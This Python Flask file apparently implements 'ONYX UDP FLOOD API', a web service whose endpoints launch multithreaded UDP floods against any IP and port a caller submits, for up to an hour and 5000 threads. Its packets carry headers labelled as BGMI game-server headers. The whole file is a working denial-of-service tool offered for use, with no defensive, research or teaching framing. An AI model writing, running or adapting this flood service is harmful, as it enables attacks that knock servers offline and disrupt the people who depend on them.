from flask import Flask, request, jsonify
from flask_cors import CORS
import threading
import socket
import random
import time
import logging
import sys
import os

app = Flask(__name__)
CORS(app)

# ============ LOGGING ============
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[logging.StreamHandler(sys.stdout)]
)
logger = logging.getLogger(__name__)

# ============ GLOBAL VARIABLES ============
active_attacks = {}
attack_lock = threading.Lock()
output_logs = []

# ============ UDP ATTACK FUNCTION ============
def udp_flood(target_ip, target_port, duration, threads, attack_id):
    global output_logs
    
    logger.info(f"[ATTACK {attack_id}] Starting UDP flood on {target_ip}:{target_port}")
    
    # Create payload
    payload = bytearray(random.getrandbits(8) for _ in range(1024))
    # BGMI magic headers
    payload[0:6] = b'\x16\x9e\x56\xc2' + bytes([random.randint(0,255)]) + bytes([random.randint(0,255)])
    
    end_time = time.time() + duration
    total_packets = 0
    
    def attack_thread(thread_id):
        nonlocal total_packets
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 8 * 1024 * 1024)
            
            local_count = 0
            while time.time() < end_time:
                for _ in range(100):
                    sock.sendto(payload, (target_ip, target_port))
                    local_count += 1
                
                if local_count % 10000 == 0:
                    logger.info(f"[Thread {thread_id}] Sent {local_count} packets")
            
            total_packets += local_count
            sock.close()
        except Exception as e:
            logger.error(f"[Thread {thread_id}] Error: {e}")
    
    # Launch threads
    thread_list = []
    for i in range(threads):
        t = threading.Thread(target=attack_thread, args=(i,))
        t.start()
        thread_list.append(t)
    
    # Wait for completion
    for t in thread_list:
        t.join()
    
    logger.info(f"[ATTACK {attack_id}] Completed! Total packets: {total_packets}")
    
    with attack_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]

# ============ ROUTES ============

@app.route('/')
def home():
    return jsonify({
        'name': 'ONYX UDP FLOOD API',
        'status': 'online',
        'endpoints': {
            '/start': 'POST - Start attack',
            '/stop': 'POST - Stop attack',
            '/status': 'GET - Check status',
            '/logs': 'GET - View logs'
        }
    })

@app.route('/health')
def health():
    return jsonify({'status': 'healthy'})

@app.route('/start', methods=['POST'])
def start_attack():
    data = request.get_json()
    
    if not data:
        return jsonify({'success': False, 'error': 'No JSON data'}), 400
    
    required = ['ip', 'port', 'duration']
    if not all(p in data for p in required):
        return jsonify({'success': False, 'error': f'Missing: {required}'}), 400
    
    target_ip = data['ip']
    target_port = int(data['port'])
    duration = int(data['duration'])
    threads = int(data.get('threads', 100))
    
    # Validate
    if target_port < 1 or target_port > 65535:
        return jsonify({'success': False, 'error': 'Invalid port'}), 400
    
    if duration < 1 or duration > 3600:
        return jsonify({'success': False, 'error': 'Duration 1-3600 seconds'}), 400
    
    if threads < 1 or threads > 5000:
        return jsonify({'success': False, 'error': 'Threads 1-5000'}), 400
    
    attack_id = f"{target_ip}:{target_port}"
    
    with attack_lock:
        if attack_id in active_attacks:
            return jsonify({'success': False, 'error': 'Attack already running'}), 400
    
    logger.info(f"Starting attack on {target_ip}:{target_port} for {duration}s with {threads} threads")
    
    attack_thread = threading.Thread(
        target=udp_flood,
        args=(target_ip, target_port, duration, threads, attack_id)
    )
    attack_thread.daemon = True
    attack_thread.start()
    
    with attack_lock:
        active_attacks[attack_id] = {
            'ip': target_ip,
            'port': target_port,
            'duration': duration,
            'start_time': time.time()
        }
    
    return jsonify({
        'success': True,
        'message': 'Attack started',
        'target': f"{target_ip}:{target_port}",
        'duration': duration,
        'threads': threads
    })

@app.route('/stop', methods=['POST'])
def stop_attack():
    data = request.get_json()
    
    if not data or 'ip' not in data:
        return jsonify({'success': False, 'error': 'Missing ip'}), 400
    
    target_ip = data['ip']
    attack_id = None
    
    with attack_lock:
        for aid in list(active_attacks.keys()):
            if aid.startswith(target_ip):
                attack_id = aid
                break
    
    if not attack_id:
        return jsonify({'success': False, 'error': 'No attack found'}), 400
    
    # Mark for stop by clearing from active dict
    with attack_lock:
        if attack_id in active_attacks:
            del active_attacks[attack_id]
    
    return jsonify({'success': True, 'message': f'Stopping attack on {target_ip}'})

@app.route('/status', methods=['GET'])
def get_status():
    with attack_lock:
        active = list(active_attacks.values())
    
    return jsonify({
        'active_attacks': len(active),
        'attacks': active
    })

@app.route('/logs', methods=['GET'])
def get_logs():
    limit = request.args.get('limit', 100, type=int)
    return jsonify({'logs': output_logs[-limit:]})

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    print(f"🔥 ONYX UDP FLOOD API Starting on port {port}")
    app.run(host='0.0.0.0', port=port, debug=False, threaded=True)
